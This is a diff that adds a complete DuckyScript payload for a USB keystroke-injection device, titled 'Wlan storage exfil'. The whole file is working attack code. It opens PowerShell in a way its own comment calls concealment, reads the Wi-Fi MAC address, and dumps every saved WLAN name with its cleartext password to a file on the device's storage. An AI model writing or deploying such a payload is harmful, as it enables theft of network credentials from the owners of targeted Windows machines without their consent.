@@ -1,0 +1,24 @@
+REM Title: Wlan storage exfil
+REM Author: bytequill
+REM Description: Exfil wlan SSID:password pairs and MacAddress
+REM Target: Windows Powershell
+ATTACKMODE HID STORAGE
+DEFINE #DRIVENAME DUCKY
+DELAY 1000
+GUI r
+DELAY 200
+REM pop up cmd window instead of powershell for concealment purposes
+STRINGLN cmd /C powershell
+DELAY 300
+STRING_POWERSHELL
+$a=(Get-Volume -FileSystemLabel '#DRIVENAME').DriveLetter;
+$b=$Env:COMPUTERNAME;
+Add-Content -Path "$a`:\$b" -Value "$(Get-NetAdapter|Where-Object {$_.Name.contains('Wi-Fi')}|Select-Object -expandproperty MacAddress)";
+(netsh wlan show profiles) -match '.+: .+'|ForEach-Object{
+    $f=$_ -replace '.+: (.+)','$1';
+    $c=(netsh wlan show profiles name=$f key=clear) -match '.+Key Co.+: .+' -replace '.+: (.+)','$1';
+    Add-Content -Path "$a`:\$b" -Value "$f`:$c"
+};exit
+END_STRING
+ENTER
+ATTACKMODE OFF
